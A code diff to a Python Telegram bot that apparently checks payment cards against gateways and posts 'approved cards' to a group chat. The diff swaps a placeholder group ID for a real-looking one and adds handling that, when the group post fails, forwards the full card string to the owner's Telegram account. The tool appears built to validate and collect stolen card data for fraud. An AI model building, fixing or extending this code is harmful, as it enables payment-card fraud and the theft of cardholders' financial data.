@@ -36,7 +36,7 @@ OWNER_ID = 8026335089  # Replace with your Telegram ID
 ADMIN_IDS = [987654321, 112233445]  # Replace with admin Telegram IDs
 USER_DATA_FILE = "users.json"
 GROUP_DATA_FILE = "groups.json"
-APPROVED_CARDS_GROUP_ID = -1001234567890  
+APPROVED_CARDS_GROUP_ID = -1002990374080
 CREDIT_RESET_INTERVAL = 3600  # 1 hour in seconds
 CREDITS_PER_HOUR = 100  # Credits per hour
 MAX_MASS_CHECK = 10  # Max cards per mass check
@@ -197,14 +197,36 @@ def send_to_group(cc, gateway, response, bin_info, time_taken, user_info):
     )
     
     try:
-        bot.send_message(
+        # First, check if the group ID is valid
+        if APPROVED_CARDS_GROUP_ID == -1001234567890:  # Default placeholder ID
+            print("Warning: APPROVED_CARDS_GROUP_ID is still the default placeholder")
+            return False
+            
+        # Try to send the message
+        sent_message = bot.send_message(
             chat_id=APPROVED_CARDS_GROUP_ID,
             text=response_text,
             parse_mode='HTML'
         )
+        print(f"Successfully sent approved card to group: {APPROVED_CARDS_GROUP_ID}")
+        return True
+        
     except Exception as e:
-        print(f"Failed to send to group: {e}")
-
+        error_msg = f"Failed to send to group {APPROVED_CARDS_GROUP_ID}: {str(e)}"
+        print(error_msg)
+        
+        # Try to send error notification to owner
+        try:
+            if user_info.id != OWNER_ID:  # Don't send error to owner if they're the one checking
+                bot.send_message(
+                    chat_id=OWNER_ID,
+                    text=f"❌ Group send failed:\n{error_msg}\n\nCard: {cc}",
+                    parse_mode='HTML'
+                )
+        except:
+            pass
+            
+        return False
 # Format for checking status
 def checking_status_format(cc, gateway, bin_info):
     parts = cc.split('|')
